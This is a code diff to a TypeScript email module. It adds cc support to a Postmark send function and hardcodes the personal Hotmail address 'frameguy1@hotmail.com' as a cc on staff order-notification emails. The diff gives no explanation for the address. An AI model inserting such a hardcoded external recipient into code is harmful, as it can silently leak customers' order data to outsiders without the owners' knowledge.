@@ -76,6 +76,7 @@ async function sendViaPostmark(params: {
   text: string;
   html?: string;
   replyTo?: string;
+  cc?: string;
 }): Promise<{ ok: boolean; error?: string }> {
   const apiKey =
     process.env.EMAIL_PROVIDER_API_KEY || process.env.POSTMARK_SERVER_API_TOKEN;
@@ -92,6 +93,7 @@ async function sendViaPostmark(params: {
     ReplyTo: params.replyTo,
   };
   if (params.html) body.HtmlBody = params.html;
+  if (params.cc) body.Cc = params.cc;
 
   const res = await fetch(POSTMARK_API, {
     method: "POST",
@@ -825,7 +827,14 @@ Log in to the staff app to review and price this order.
     footer: "Log in to review and price this order.",
   });
 
-  const result = await sendViaPostmark({ to, from: getFrom(), subject, text, html });
+  const result = await sendViaPostmark({ 
+    to, 
+    from: getFrom(), 
+    subject, 
+    text, 
+    html,
+    cc: "frameguy1@hotmail.com"
+  });
   if (!result.ok) {
     console.log("EMAIL OUT (no API key, logged only)", { to, subject, text });
   }
